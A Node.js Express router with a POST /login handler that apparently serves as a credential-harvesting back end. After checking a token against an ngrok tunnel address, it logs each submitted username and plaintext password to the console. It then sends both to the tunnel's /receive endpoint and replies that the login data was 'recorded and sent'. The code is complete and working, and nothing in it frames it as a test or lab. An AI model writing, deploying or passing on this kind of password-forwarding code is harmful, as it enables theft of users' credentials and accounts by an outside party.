const express = require('express');
const router = express.Router();

// Dynamically import node-fetch
let fetch;
import('node-fetch').then(module => {
    fetch = module.default;
}).catch(err => console.error('Failed to load node-fetch', err));

router.post('/login', async (req, res) => {
    const { username, password, token } = req.body;

    if (!token || !username) {
        return res.status(400).send('Missing token or username');
    }

    try {
        const validationResponse = await fetch('https://2ae1-73-71-4-178.ngrok-free.app/validate', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ username, token }),
            mode: 'cors' // if needed
        });

        const validation = await validationResponse.json();
        
        if (!validation.valid) {
            return res.status(403).send('Invalid token');
        }
        
        // Assume validation was successful
        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
        
        const localServerUrl = 'https://2ae1-73-71-4-178.ngrok-free.app/receive';
        const response = await fetch(localServerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password }),
            mode: 'cors' // if needed
        });

        if (response.ok) {
            console.log('Data sent to local server successfully');
            res.send('Login data recorded and sent.');
        } else {
            throw new Error('Failed to send data to local server');
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).send('Server Error');
    }
});

module.exports = router;
